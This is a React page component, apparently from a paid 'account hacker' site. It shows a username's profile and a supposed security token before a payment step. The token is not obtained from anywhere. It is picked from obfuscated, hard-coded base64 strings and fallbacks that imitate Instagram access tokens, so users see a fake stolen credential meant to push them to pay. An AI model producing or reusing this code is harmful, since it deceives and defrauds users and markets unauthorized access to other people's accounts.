
import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useHackerContext } from "@/context/HackerContext";
import { toast } from "sonner";
import ErrorState from "@/components/user-info/ErrorState";
import LoadingState from "@/components/user-info/LoadingState";
import MainContent from "@/components/user-info/MainContent";

// Demo predefined security strings - stored as an encoded string for additional obfuscation
const encodedSecurityStrings = [
  "SUdRVkpZZUVoeWVrUklhMEpaQVdFOWtPVkJNY0ZaQVJUMVJ1WDA1d1MyZ3lUVkI1UlZrd1ZrOXNWRFpBYmVVTmtkRmQwTFZkd2IwMXlSVTVKUmpWMWVUUkVNVFpBNVRrTkZlbmxYUWpaQXlV",
  "SUdRVkpXVkRsYU5rNWFZMGRyTUY5allqQkVTVlJrWWpFMlpGbDZTMEpSV2tocGVVVmFlR3R5YVhGa2NVTTFWV1Z4WkdwRlRYVnpRVTAzTlROVk4wZFZUV2g0UjNOaFJraHhXRWxPTg==",
  "SUdRVkpXVURSVk9YWkFrZG01dlpqSnhUR053TUVsRWJFeGpXbE5IUzJkME4yeHZhRlpBVVVsd01ORlJPYVhCSlVETnNaQXhad0YzZEdTMGxmUmtsTmNsSkxVVFJvTlZSbVNVSlRNRkpWYm1OU04==",
  "SUdRVkpZV0ZjME5teFpSMWxmT0RsTk5ISjNObDgxV0d4UVgzcDRVV3RITUZOTVlWVXlWbkpqWTJOMU5VRm5NWFZwWTFaQUVSMVJWWkFHUlZZM1ltSkNXRWhFWkFrUlJMVzVoTmpOek4=",
  "SUdRVkpYZDBNeFRsSXhiVlV5U2xOeFRreHRjWFZ3T1dzeFFYWkFwUTFRMGVUbGpaMWROS1hoMFozaE9iM05PUmw4MWMwVjNMVmRwYUc5VU5GTlJjMEp5UVZwWFFVOVliVzgzUVd4TU4="
];

// Function to decode base64 strings with error handling
const decodeBase64 = (str: string): string => {
  try {
    // First make sure the string has valid base64 characters
    if (!/^[A-Za-z0-9+/=]+$/.test(str)) {
      console.warn("Invalid base64 characters in string");
      return "SECURITY-TOKEN-ERROR";
    }
    
    // Make sure the length is valid (multiple of 4)
    if (str.length % 4 !== 0) {
      console.warn("Invalid base64 string length");
      return "SECURITY-TOKEN-ERROR";
    }
    
    try {
      return atob(str);
    } catch (e) {
      console.error("Failed to decode security token:", e);
      return "SECURITY-TOKEN-ERROR";
    }
  } catch (e) {
    console.error("Error in decodeBase64:", e);
    return "SECURITY-TOKEN-ERROR";
  }
};

// Decode security strings on demand, not storing them in plaintext
const getDecodedSecurityStrings = (): string[] => {
  return encodedSecurityStrings.map(str => {
    const decoded = decodeBase64(str);
    if (decoded === "SECURITY-TOKEN-ERROR") {
      console.warn("Failed to decode a security token, using fallback");
      return "IGQVJXxyz123SecurityTokenFallback456abc";
    }
    return decoded;
  });
};

const UserInfoPage = () => {
  const { username, profileData, error, isLoading, setError } = useHackerContext();
  const navigate = useNavigate();

  useEffect(() => {
    if (!username && !isLoading) {
      navigate("/");
    }
  }, [navigate, username, isLoading]);

  // Get a security token based on username, with improved security and fallbacks
  const getSecurityToken = (): string => {
    if (!username) {
      console.log("No username provided, using default security token");
      return getDecodedSecurityStrings()[0] || "IGQVJXDefaultSecurityTokenFallback";
    }
    
    try {
      // Use a more complex algorithm to determine which token to use
      const hashCode = Array.from(username).reduce(
        (acc, char) => (acc * 31 + char.charCodeAt(0)) & 0xffffffff, 0
      );
      const decodedStrings = getDecodedSecurityStrings();
      if (decodedStrings.length === 0) {
        console.warn("No valid security tokens available, using fallback");
        return "IGQVJXEmergencySecurityTokenFallback";
      }
      
      const index = Math.abs(hashCode % decodedStrings.length);
      const token = decodedStrings[index];
      return token || "IGQVJXBackupSecurityToken";
    } catch (e) {
      console.error("Error generating security token:", e);
      return "IGQVJXErrorSecurityTokenFallback";
    }
  };

  const securityToken = getSecurityToken();

  const handleContinueToPayment = () => {
    navigate("/payment");
  };

  const handleRetry = () => {
    navigate("/");
  };

  const handleTutorialClick = () => {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
  };

  if (error) {
    return <ErrorState error={error} onRetry={handleRetry} onTutorial={handleTutorialClick} />;
  }
  
  if (isLoading) {
    return <LoadingState onTutorial={handleTutorialClick} />;
  }

  return (
    <MainContent 
      username={username} 
      profileData={profileData} 
      securityToken={securityToken}
      onContinueToPayment={handleContinueToPayment}
      onTutorial={handleTutorialClick}
    />
  );
};

export default UserInfoPage;
